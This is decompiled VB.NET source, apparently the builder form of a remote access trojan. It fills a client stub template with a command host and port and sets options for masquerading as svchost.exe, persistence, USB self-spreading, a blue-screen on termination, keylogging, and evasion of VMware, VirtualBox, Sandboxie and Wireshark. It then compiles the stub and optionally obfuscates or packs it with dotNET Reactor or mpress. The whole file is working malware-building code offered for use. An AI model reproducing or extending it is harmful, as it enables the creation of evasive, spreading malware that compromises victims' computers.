			Me.host.Text = Class6.smethod_2("host", Me.host.Text)
			Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("p", Conversions.ToString(Me.port.Value)))
			Me.exe.Text = Class6.smethod_2("exe", Me.exe.Text)
			Me.dir.SelectedIndex = Conversions.ToInteger(Class6.smethod_2("dir", Conversions.ToString(Me.dir.SelectedIndex)))
			Me.VN.Text = Class6.smethod_2("vn", Me.VN.Text)
			Me.bsod.Checked = Conversions.ToBoolean(Class6.smethod_2("bsod", Me.bsod.Checked.ToString()))
			Me.Idr.Checked = Conversions.ToBoolean(Class6.smethod_2("Idr", Me.Idr.Checked.ToString()))
			Me.Isu.Checked = Conversions.ToBoolean(Class6.smethod_2("Isu", Me.Isu.Checked.ToString()))
			Me.Isf.Checked = Conversions.ToBoolean(Class6.smethod_2("Isf", Me.Isf.Checked.ToString()))
			Me.USB_SP.Checked = Conversions.ToBoolean(Class6.smethod_2("USB_SP", Me.USB_SP.Checked.ToString()))
			Me.klen.Value = Conversions.ToDecimal(Class6.smethod_2("klen", Me.klen.Value.ToString()))
			Me.Anti_CH.Checked = Conversions.ToBoolean(Class6.smethod_2("Anti_CH", Me.Anti_CH.Checked.ToString()))
			Me.string_0 = Class6.smethod_2("ico", String.Empty)
			If Not File.Exists(Me.string_0) Then
				Me.string_0 = String.Empty
			End If
			If Convert.ToDouble(Me.port.Value) <> Conversions.ToDouble(Class6.smethod_2("port", Conversions.ToString(Me.port.Value))) Then
				Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))
			End If
			Try
			Catch ex As Exception
				Me.string_0 = String.Empty
			End Try
		End Sub

		' Token: 0x0600013F RID: 319 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub Button1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000140 RID: 320 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub Idr_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000141 RID: 321 RVA: 0x0000CC44 File Offset: 0x0000AE44
		Private Sub Anti_CH_CheckedChanged(sender As Object, e As EventArgs)
			Dim toolTip As ToolTip = New ToolTip()
			toolTip.SetToolTip(Me.Anti_CH, "Vmware|Virtualbox|Sandboxie|Wireshark|ApateDNS|AndSomeDisassemblersApps")
		End Sub

		' Token: 0x06000142 RID: 322 RVA: 0x0000CC68 File Offset: 0x0000AE68
		Private Sub USB_SP_CheckedChanged(sender As Object, e As EventArgs)
			Dim toolTip As ToolTip = New ToolTip()
			toolTip.SetToolTip(Me.USB_SP, "It will copy your Clinet.exe on any usb attached to PC")
		End Sub

		' Token: 0x06000143 RID: 323 RVA: 0x0000CC8C File Offset: 0x0000AE8C
		Private Sub CKOBF_CheckedChanged(sender As Object, e As EventArgs)
			Dim toolTip As ToolTip = New ToolTip()
			toolTip.SetToolTip(Me.CKOBF, "A very simple obfuscation, DON'T use it if you want to use some crypter")
		End Sub

		' Token: 0x06000144 RID: 324 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub exe_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000145 RID: 325 RVA: 0x0000CCB0 File Offset: 0x0000AEB0
		Private Sub CheckBox7_CheckedChanged(sender As Object, e As EventArgs)
			If Not Me.CheckBox7.Checked Then
				Me.TextBox5.Enabled = False
			Else
				Me.TextBox5.Enabled = True
			End If
		End Sub

		' Token: 0x06000146 RID: 326 RVA: 0x0000CCE8 File Offset: 0x0000AEE8
		Private Sub CheckBox9_CheckedChanged(sender As Object, e As EventArgs)
			If Not Me.CheckBox9.Checked Then
				Me.TextBox6.Enabled = False
			Else
				Me.TextBox6.Enabled = True
			End If
		End Sub

		' Token: 0x06000147 RID: 327 RVA: 0x0000CD20 File Offset: 0x0000AF20
		Private Sub CheckBox8_CheckedChanged(sender As Object, e As EventArgs)
			If Not Me.CheckBox8.Checked Then
				Me.TextBox7.Enabled = False
			Else
				Me.TextBox7.Enabled = True
			End If
		End Sub

		' Token: 0x06000148 RID: 328 RVA: 0x0000CD58 File Offset: 0x0000AF58
		Public Shared Function Base64Decode(base64EncodedData As String) As String
			Dim bytes As Byte() = Convert.FromBase64String(base64EncodedData)
			Return Encoding.UTF8.GetString(bytes)
		End Function

		' Token: 0x06000149 RID: 329 RVA: 0x0000CD7C File Offset: 0x0000AF7C
		Public Shared Function Base64Encode(plainText As String) As String
			Return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText))
		End Function

		' Token: 0x0600014A RID: 330 RVA: 0x0000CD9C File Offset: 0x0000AF9C
		Private Sub Button2_Click(sender As Object, e As EventArgs)
			Me.TextBox2.Text = Builder.Base64Encode(Me.host.Text)
			Me.host.Text = Builder.Base64Decode(Me.TextBox2.Text)
			Me.TextBox3.Text = Builder.Base64Encode(Me.TextBox1.Text)
			Me.TextBox1.Text = Builder.Base64Decode(Me.TextBox3.Text)
			Me.TextBox4.Text = Builder.Base64Encode(Conversions.ToString(Me.port.Value))
			Me.port.Value = Conversions.ToDecimal(Builder.Base64Decode(Me.TextBox4.Text))
		End Sub

		' Token: 0x0600014B RID: 331 RVA: 0x0000CE58 File Offset: 0x0000B058
		Private Sub Button3_Click(sender As Object, e As EventArgs)
			Dim saveFileDialog As SaveFileDialog = New SaveFileDialog() With { .Filter = "", .FileName = "" }
			If saveFileDialog.ShowDialog() = DialogResult.OK Then
				If File.Exists(saveFileDialog.FileName) Then
					File.Delete(saveFileDialog.FileName)
				End If
				Dim text As String = File.ReadAllText(Application.StartupPath + "\Stub\Stub.il")
				Dim newValue As String = Class6.smethod_4(String.Concat(New String() { Me.VN.Text, Me.host.Text, Conversions.ToString(Me.port.Value), Me.exe.Text, Me.dir.Text, Me.bsod.Checked.ToString(), Me.Idr.Checked.ToString(), Me.Isu.Checked.ToString(), Me.Isf.Checked.ToString(), Me.USB_SP.Checked.ToString(), Me.Anti_CH.Checked.ToString() }))
				Dim vn As TextBox = Me.VN
				Dim text2 As String = vn.Text
				vn.Text = text2
				text = text.Replace("[VN]", Class6.smethod_14(text2)).Replace("[H]", Me.host.Text).Replace("[P]", Conversions.ToString(Me.port.Value)).Replace("[EXE]", Me.exe.Text).Replace("[DR]", Me.dir.Text.Replace("%", String.Empty)).Replace("[BD]", Me.bsod.Checked.ToString()).Replace("[RG]", newValue).Replace("[Idr]", Me.Idr.Checked.ToString()).Replace("[Isu]", Me.Isu.Checked.ToString()).Replace("[Isf]", Me.Isf.Checked.ToString()).Replace("[USB_SP]", Me.USB_SP.Checked.ToString()).Replace("[klen]", Me.klen.Value.ToString()).Replace("[Anti_CH]", Me.Anti_CH.Checked.ToString())
				File.WriteAllText(Interaction.Environ("temp") + "\stub.il", text)
				Dim startInfo As ProcessStartInfo = New ProcessStartInfo() With { .FileName = Interaction.Environ("windir") + "\Microsoft.NET\Framework\v2.0.50727\ilasm.exe", .CreateNoWindow = True, .WindowStyle = ProcessWindowStyle.Hidden, .Arguments = String.Concat(New String() { "/alignment=512 /QUIET """, Interaction.Environ("temp"), "\stub.il"" /output:""", saveFileDialog.FileName, """" }) }
				Process.Start(startInfo).WaitForExit()
				If Me.string_0 IsNot Nothing AndAlso File.Exists(Me.string_0) Then
					IconN.InjectIcon(saveFileDialog.FileName, Me.string_0)
				End If
				Dim intptr_ As IntPtr = GClass2.BeginUpdateResource(saveFileDialog.FileName, False)
				Dim array As Byte() = File.ReadAllBytes(Application.StartupPath + "\Stub\Stub.manifest")
				GClass2.UpdateResource(intptr_, CType(24, IntPtr), CType(1, IntPtr), 0S, array, array.Length)
				GClass2.EndUpdateResource(intptr_, False)
				Class6.smethod_3("host", Me.host.Text)
				Class6.smethod_3("p", Conversions.ToString(Me.port.Value))
				Class6.smethod_3("exe", Me.exe.Text)
				Class6.smethod_3("dir", Conversions.ToString(Me.dir.SelectedIndex))
				Class6.smethod_3("vn", Me.VN.Text)
				Class6.smethod_3("bsod", Me.bsod.Checked.ToString())
				Class6.smethod_3("ico", Me.string_0)
				Class6.smethod_3("Idr", Me.Idr.Checked.ToString())
				Class6.smethod_3("Isu", Me.Isu.Checked.ToString())
				Class6.smethod_3("Isf", Me.Isf.Checked.ToString())
				Class6.smethod_3("USB_SP", Me.USB_SP.Checked.ToString())
				Class6.smethod_3("klen", Me.klen.Value.ToString())
				Class6.smethod_3("Anti_CH", Me.Anti_CH.Checked.ToString())
				Me.Close()
				Thread.Sleep(100)
				If Me.CKOBF.Checked Then
					Application.DoEvents()
					Dim dotNET_Reactor As Byte() = Resources.dotNET_Reactor
					File.WriteAllBytes(Application.StartupPath + "\dotNET_Reactor.exe", dotNET_Reactor)
					Interaction.Shell(String.Concat(New String() { "cmd.exe /C dotNET_Reactor.exe -file """, saveFileDialog.FileName, """ -admin 0 -shownagscreen 0 -showloadingscreen 0 -targetfile """, saveFileDialog.FileName, """ -antitamp 1 -compression 1 -control_flow_obfuscation 1  -flow_level 9 -nativeexe 0 -necrobit 1 -necrobit_comp 1 -prejit 0 -incremental_obfuscation 1 -obfuscate_public_types 1 -resourceencryption 1 -stringencryption 1 -antistrong 1" }), AppWinStyle.NormalFocus, True, -1)
					Thread.Sleep(100)
					Me.Close()
					MyProject.Computer.FileSystem.DeleteFile(Application.StartupPath + "\dotNET_Reactor.exe")
				End If
				If Me.CKUpx.Checked Then
					Application.DoEvents()
					Dim mpress As Byte() = Resources.mpress
					File.WriteAllBytes(Application.StartupPath + "\mpress.exe", mpress)
					Interaction.Shell("cmd.exe /C mpress.exe -s """ + saveFileDialog.FileName + """", AppWinStyle.NormalFocus, True, -1)
					Thread.Sleep(100)
					Me.Close()
					MyProject.Computer.FileSystem.DeleteFile(Application.StartupPath + "\mpress.exe")
				End If
				MessageBox.Show("Stub created successfully.", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			End If
		End Sub

		' Token: 0x0600014C RID: 332 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub TabPage1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x0600014D RID: 333 RVA: 0x0000D4D0 File Offset: 0x0000B6D0
		Private Sub Button1_Click_1(sender As Object, e As EventArgs)
			Dim saveFileDialog As SaveFileDialog = New SaveFileDialog() With { .Filter = "EXE|*.exe", .FileName = "Client.exe" }
			If saveFileDialog.ShowDialog() = DialogResult.OK Then
				If File.Exists(saveFileDialog.FileName) Then
					File.Delete(saveFileDialog.FileName)
				End If
				Dim text As String = File.ReadAllText(Application.StartupPath + "\Stub\Stub.il")
				Dim newValue As String = Class6.smethod_4(String.Concat(New String() { Me.VN.Text, Me.host.Text, Conversions.ToString(Me.port.Value), Me.exe.Text, Me.dir.Text, Me.bsod.Checked.ToString(), Me.Idr.Checked.ToString(), Me.Isu.Checked.ToString(), Me.Isf.Checked.ToString(), Me.USB_SP.Checked.ToString(), Me.Anti_CH.Checked.ToString() }))
				Dim vn As TextBox = Me.VN
				Dim text2 As String = vn.Text
				vn.Text = text2
				text = text.Replace("[VN]", Class6.smethod_14(text2)).Replace("[H]", Me.host.Text).Replace("[P]", Conversions.ToString(Me.port.Value)).Replace("[EXE]", Me.exe.Text).Replace("[DR]", Me.dir.Text.Replace("%", String.Empty)).Replace("[BD]", Me.bsod.Checked.ToString()).Replace("[RG]", newValue).Replace("[Idr]", Me.Idr.Checked.ToString()).Replace("[Isu]", Me.Isu.Checked.ToString()).Replace("[Isf]", Me.Isf.Checked.ToString()).Replace("[USB_SP]", Me.USB_SP.Checked.ToString()).Replace("[klen]", Me.klen.Value.ToString()).Replace("[Anti_CH]", Me.Anti_CH.Checked.ToString())
				File.WriteAllText(Interaction.Environ("temp") + "\stub.il", text)
				Dim startInfo As ProcessStartInfo = New ProcessStartInfo() With { .FileName = Interaction.Environ("windir") + "\Microsoft.NET\Framework\v2.0.50727\ilasm.exe", .CreateNoWindow = True, .WindowStyle = ProcessWindowStyle.Hidden, .Arguments = String.Concat(New String() { "/alignment=512 /QUIET """, Interaction.Environ("temp"), "\stub.il"" /output:""", saveFileDialog.FileName, """" }) }
				Process.Start(startInfo).WaitForExit()
				If Me.string_0 IsNot Nothing AndAlso File.Exists(Me.string_0) Then
					IconN.InjectIcon(saveFileDialog.FileName, Me.string_0)
				End If
				Dim intptr_ As IntPtr = GClass2.BeginUpdateResource(saveFileDialog.FileName, False)
				Dim array As Byte() = File.ReadAllBytes(Application.StartupPath + "\Stub\Stub.manifest")
				GClass2.UpdateResource(intptr_, CType(24, IntPtr), CType(1, IntPtr), 0S, array, array.Length)
				GClass2.EndUpdateResource(intptr_, False)
				Class6.smethod_3("host", Me.host.Text)
				Class6.smethod_3("p", Conversions.ToString(Me.port.Value))
				Class6.smethod_3("exe", Me.exe.Text)
				Class6.smethod_3("dir", Conversions.ToString(Me.dir.SelectedIndex))
				Class6.smethod_3("vn", Me.VN.Text)
				Class6.smethod_3("bsod", Me.bsod.Checked.ToString())
				Class6.smethod_3("ico", Me.string_0)
				Class6.smethod_3("Idr", Me.Idr.Checked.ToString())
				Class6.smethod_3("Isu", Me.Isu.Checked.ToString())
				Class6.smethod_3("Isf", Me.Isf.Checked.ToString())
				Class6.smethod_3("USB_SP", Me.USB_SP.Checked.ToString())
				Class6.smethod_3("klen", Me.klen.Value.ToString())
				Class6.smethod_3("Anti_CH", Me.Anti_CH.Checked.ToString())
				Me.Close()
				Thread.Sleep(100)
				If Me.CKOBF.Checked Then
					Application.DoEvents()
					Dim dotNET_Reactor As Byte() = Resources.dotNET_Reactor
					File.WriteAllBytes(Application.StartupPath + "\dotNET_Reactor.exe", dotNET_Reactor)
					Interaction.Shell(String.Concat(New String() { "cmd.exe /C dotNET_Reactor.exe -file """, saveFileDialog.FileName, """ -admin 0 -shownagscreen 0 -showloadingscreen 0 -targetfile """, saveFileDialog.FileName, """ -antitamp 1 -compression 1 -control_flow_obfuscation 1  -flow_level 9 -nativeexe 0 -necrobit 1 -necrobit_comp 1 -prejit 0 -incremental_obfuscation 1 -obfuscate_public_types 1 -resourceencryption 1 -stringencryption 1 -antistrong 1" }), AppWinStyle.NormalFocus, True, -1)
					Thread.Sleep(100)
					Me.Close()
					MyProject.Computer.FileSystem.DeleteFile(Application.StartupPath + "\dotNET_Reactor.exe")
				End If
				If Me.CKUpx.Checked Then
					Application.DoEvents()
					Dim mpress As Byte() = Resources.mpress
					File.WriteAllBytes(Application.StartupPath + "\mpress.exe", mpress)
					Interaction.Shell("cmd.exe /C mpress.exe -s """ + saveFileDialog.FileName + """", AppWinStyle.NormalFocus, True, -1)
					Thread.Sleep(100)
					Me.Close()
					MyProject.Computer.FileSystem.DeleteFile(Application.StartupPath + "\mpress.exe")
				End If
				MessageBox.Show("Stub created successfully.", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			End If
		End Sub

		' Token: 0x0600014E RID: 334 RVA: 0x0000DB48 File Offset: 0x0000BD48
		Private Sub Idr_CheckedChanged_1(sender As Object, e As EventArgs)
			If Not Me.Idr.Checked Then
				If Operators.CompareString(Me.exe.Text, String.Empty, False) = 0 Then
					Me.exe.Text = "svchost.exe"
				End If
				Me.exe.Enabled = False
				Me.dir.Enabled = False
			Else
				Me.exe.Enabled = True
				Me.dir.Enabled = True
			End If
		End Sub

		' Token: 0x0600014F RID: 335 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub PictureBox1_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x04000055 RID: 85
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000057 RID: 87
		<AccessedThroughProperty("T1")>
		Private _T1 As TextBox

		' Token: 0x04000058 RID: 88
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x04000059 RID: 89
		<AccessedThroughProperty("FlatTabControl1")>
		Private _FlatTabControl1 As FlatTabControl

		' Token: 0x0400005A RID: 90
		<AccessedThroughProperty("TabPage1")>
		Private _TabPage1 As TabPage

		' Token: 0x0400005B RID: 91
		<AccessedThroughProperty("TabPage2")>
		Private _TabPage2 As TabPage

		' Token: 0x0400005C RID: 92
		<AccessedThroughProperty("TabPage3")>
		Private _TabPage3 As TabPage

		' Token: 0x0400005D RID: 93
		<AccessedThroughProperty("CheckBox5")>
		Private _CheckBox5 As CheckBox

		' Token: 0x0400005E RID: 94
		<AccessedThroughProperty("Label14")>
		Private _Label14 As Label

		' Token: 0x0400005F RID: 95
		<AccessedThroughProperty("NumericUpDown1")>
		Private _NumericUpDown1 As NumericUpDown

		' Token: 0x04000060 RID: 96
		<AccessedThroughProperty("CheckBox6")>
		Private _CheckBox6 As CheckBox

		' Token: 0x04000061 RID: 97
		<AccessedThroughProperty("CheckBox4")>
		Private _CheckBox4 As CheckBox

		' Token: 0x04000062 RID: 98
		<AccessedThroughProperty("CheckBox3")>
		Private _CheckBox3 As CheckBox

		' Token: 0x04000063 RID: 99
		<AccessedThroughProperty("CheckBox2")>
		Private _CheckBox2 As CheckBox

		' Token: 0x04000064 RID: 100
		<AccessedThroughProperty("CheckBox1")>
		Private _CheckBox1 As CheckBox

		' Token: 0x04000065 RID: 101
		<AccessedThroughProperty("GroupBox2")>
		Private _GroupBox2 As GroupBox

		' Token: 0x04000066 RID: 102
		<AccessedThroughProperty("port")>
		Private _port As NumericUpDown

		' Token: 0x04000067 RID: 103
		<AccessedThroughProperty("Button2")>
		Private _Button2 As Button

		' Token: 0x04000068 RID: 104
		<AccessedThroughProperty("Label10")>
		Private _Label10 As Label

		' Token: 0x04000069 RID: 105
		<AccessedThroughProperty("TextBox4")>
		Private _TextBox4 As TextBox

		' Token: 0x0400006A RID: 106
		<AccessedThroughProperty("TextBox3")>
		Private _TextBox3 As TextBox

		' Token: 0x0400006B RID: 107
		<AccessedThroughProperty("Label9")>
		Private _Label9 As Label

		' Token: 0x0400006C RID: 108
		<AccessedThroughProperty("Label8")>
		Private _Label8 As Label

		' Token: 0x0400006D RID: 109
		<AccessedThroughProperty("Label7")>
		Private _Label7 As Label

		' Token: 0x0400006E RID: 110
		<AccessedThroughProperty("TextBox2")>
		Private _TextBox2 As TextBox

		' Token: 0x0400006F RID: 111
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x04000070 RID: 112
		<AccessedThroughProperty("host")>
		Private _host As TextBox

		' Token: 0x04000071 RID: 113
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x04000072 RID: 114
		<AccessedThroughProperty("CKUpx")>
		Private _CKUpx As CheckBox

		' Token: 0x04000073 RID: 115
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x04000074 RID: 116
		<AccessedThroughProperty("CKOBF")>
		Private _CKOBF As CheckBox

		' Token: 0x04000075 RID: 117
		<AccessedThroughProperty("USB_SP")>
		Private _USB_SP As CheckBox

		' Token: 0x04000076 RID: 118
		<AccessedThroughProperty("Anti_CH")>
		Private _Anti_CH As CheckBox

		' Token: 0x04000077 RID: 119
		<AccessedThroughProperty("Label6")>
		Private _Label6 As Label

		' Token: 0x04000078 RID: 120
		<AccessedThroughProperty("klen")>
		Private _klen As NumericUpDown

		' Token: 0x04000079 RID: 121
		<AccessedThroughProperty("Isu")>
		Private _Isu As CheckBox

		' Token: 0x0400007A RID: 122
		<AccessedThroughProperty("Isf")>
		Private _Isf As CheckBox

		' Token: 0x0400007B RID: 123
		<AccessedThroughProperty("bsod")>
		Private _bsod As CheckBox

		' Token: 0x0400007C RID: 124
		<AccessedThroughProperty("VN")>
		Private _VN As TextBox

		' Token: 0x0400007D RID: 125
		<AccessedThroughProperty("Label5")>
		Private _Label5 As Label

		' Token: 0x0400007E RID: 126
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x0400007F RID: 127
		<AccessedThroughProperty("GroupBox1")>
		Private _GroupBox1 As GroupBox

		' Token: 0x04000080 RID: 128
		<AccessedThroughProperty("CheckBox9")>
		Private _CheckBox9 As CheckBox

		' Token: 0x04000081 RID: 129
		<AccessedThroughProperty("CheckBox8")>
		Private _CheckBox8 As CheckBox

		' Token: 0x04000082 RID: 130
		<AccessedThroughProperty("CheckBox7")>
		Private _CheckBox7 As CheckBox

		' Token: 0x04000083 RID: 131
		<AccessedThroughProperty("TextBox7")>
		Private _TextBox7 As TextBox

		' Token: 0x04000084 RID: 132
		<AccessedThroughProperty("TextBox6")>
		Private _TextBox6 As TextBox

		' Token: 0x04000085 RID: 133
		<AccessedThroughProperty("TextBox5")>
		Private _TextBox5 As TextBox

		' Token: 0x04000086 RID: 134
		<AccessedThroughProperty("Label11")>
		Private _Label11 As Label

		' Token: 0x04000087 RID: 135
		<AccessedThroughProperty("Idr")>
		Private _Idr As CheckBox

		' Token: 0x04000088 RID: 136
		<AccessedThroughProperty("dir")>
		Private _dir As ComboBox

		' Token: 0x04000089 RID: 137
		<AccessedThroughProperty("Label4")>
		Private _Label4 As Label

		' Token: 0x0400008A RID: 138
		<AccessedThroughProperty("exe")>
		Private _exe As TextBox

		' Token: 0x0400008B RID: 139
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x0400008C RID: 140
		<AccessedThroughProperty("UserImage1")>
		Private _UserImage1 As UserImage

		' Token: 0x0400008D RID: 141
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox

		' Token: 0x0400008E RID: 142
		Private string_0 As String
	End Class
End Namespace
